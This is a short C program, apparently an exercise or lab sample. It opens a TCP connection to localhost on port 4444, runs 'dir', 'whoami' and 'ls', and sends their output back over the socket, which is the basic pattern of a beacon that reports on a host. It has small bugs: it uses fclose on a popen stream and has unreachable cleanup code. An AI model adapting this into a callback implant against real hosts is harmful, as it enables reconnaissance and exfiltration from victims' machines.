#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#else
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#endif

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4444

#ifdef _WIN32
void init_winsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup failed");
        exit(1);
    }
}

void cleanup_winsock() {
    WSACleanup();
}
#endif

void execute_command(int sock) {
    char buffer[1024];
    FILE *fp;
    size_t bytes_read;
    char *commands[] = {
        "dir",
        "whoami",
        "ls",
        NULL   
    };

    for (int i = 0; commands[i] != NULL; i++) {
        fp = popen(commands[i], "r");
        if (fp == NULL) {
            perror("Failed to run command");
            continue;
        }
        while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
            send(sock, buffer, bytes_read, 0);
        }
        fclose(fp);
    }
}
int main() {
    int sock;
    struct sockaddr_in server_addr;

#ifdef _WIN32
    init_winsock();
#endif
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Client: Socket creation failed");
        exit(1);
    }
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Client: Connection failed");
        exit(1);
    }

    printf("Connected to the server. Executing commands...\n");
    execute_command(sock);
    while (1) {
        sleep(1);
    }

    close(sock);

#ifdef _WIN32
    cleanup_winsock();
#endif

    return 0;
}
